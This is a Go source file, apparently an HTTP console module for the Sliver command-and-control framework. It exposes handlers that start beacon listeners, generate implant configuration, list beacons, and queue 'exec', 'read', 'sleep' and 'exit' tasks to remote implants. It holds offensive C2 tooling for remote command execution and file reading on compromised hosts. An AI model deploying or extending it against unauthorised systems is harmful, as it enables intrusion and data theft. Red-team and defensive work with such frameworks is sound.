package web

import (
	"net/http"

	"github.com/bishopfox/sliver/server/litebeacon"
)

func (s *Service) liteListenerStart(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Host string `json:"host"`
		Port int    `json:"port"`
		Path string `json:"path"`
		URL  string `json:"url"`
	}
	if err := decodeJSON(r, &body); err != nil {
		writeErr(w, http.StatusBadRequest, "监听参数不合法")
		return
	}
	addr, err := litebeacon.StartDefault(body.Host, body.Port, body.Path, body.URL)
	if err != nil {
		rpcErr(w, err)
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "addr": addr})
}

func (s *Service) liteListenerStop(w http.ResponseWriter, r *http.Request) {
	if err := litebeacon.StopDefault(); err != nil {
		rpcErr(w, err)
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (s *Service) liteConfig(w http.ResponseWriter, r *http.Request) {
	var (
		info litebeacon.ConfigInfo
		err  error
	)
	if r.Method == http.MethodPost {
		info, err = litebeacon.NewConfig("console")
	} else {
		info, err = litebeacon.GetConfig()
	}
	if err != nil {
		rpcErr(w, err)
		return
	}
	writeJSON(w, http.StatusOK, info)
}

func (s *Service) liteBeacons(w http.ResponseWriter, r *http.Request) {
	writeJSON(w, http.StatusOK, map[string]any{"Beacons": litebeacon.ListBeacons()})
}

func (s *Service) liteBeaconDelete(w http.ResponseWriter, r *http.Request) {
	var body struct {
		ID string `json:"id"`
	}
	if err := decodeJSON(r, &body); err != nil || body.ID == "" {
		writeErr(w, http.StatusBadRequest, "缺少信标 ID")
		return
	}
	litebeacon.DeleteBeacon(body.ID)
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (s *Service) liteTask(w http.ResponseWriter, r *http.Request) {
	var body struct {
		BeaconID string `json:"beaconId"`
		Type     string `json:"type"`
		Cmd      string `json:"cmd"`
		Path     string `json:"path"`
		Timeout  int    `json:"timeout"`
		Interval int    `json:"interval"`
	}
	if err := decodeJSON(r, &body); err != nil {
		writeErr(w, http.StatusBadRequest, "任务参数不合法")
		return
	}
	if body.BeaconID == "" {
		writeErr(w, http.StatusBadRequest, "缺少信标 ID")
		return
	}
	task := litebeacon.Task{Cmd: body.Cmd, Path: body.Path}
	switch body.Type {
	case "exec":
		if body.Cmd == "" {
			writeErr(w, http.StatusBadRequest, "命令不能为空")
			return
		}
		// TLV u16 上限内还需留出帧头，超长命令在这里拦下而不是丢进队列后被静默丢弃
		if len(body.Cmd) > 60000 {
			writeErr(w, http.StatusBadRequest, "命令太长，上限 60000 字节")
			return
		}
		task.Type = litebeacon.TaskExec
		if body.Timeout <= 0 || body.Timeout > 600 {
			body.Timeout = 30
		}
		task.TimeoutSec = uint16(body.Timeout)
	case "read":
		if body.Path == "" {
			writeErr(w, http.StatusBadRequest, "路径不能为空")
			return
		}
		task.Type = litebeacon.TaskRead
	case "sleep":
		if body.Interval <= 0 || body.Interval > 86400 {
			body.Interval = 180
		}
		task.Type = litebeacon.TaskSleep
		task.IntervalSec = uint32(body.Interval)
	case "exit":
		task.Type = litebeacon.TaskExit
	default:
		writeErr(w, http.StatusBadRequest, "不支持的任务类型")
		return
	}
	queued, ok := litebeacon.QueueTask(body.BeaconID, task)
	if !ok {
		writeErr(w, http.StatusBadRequest, "信标不存在")
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"taskId": queued.ID})
}

func (s *Service) liteResults(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("beacon")
	if id == "" {
		writeErr(w, http.StatusBadRequest, "缺少信标 ID")
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"Results": litebeacon.TakeResults(id)})
}
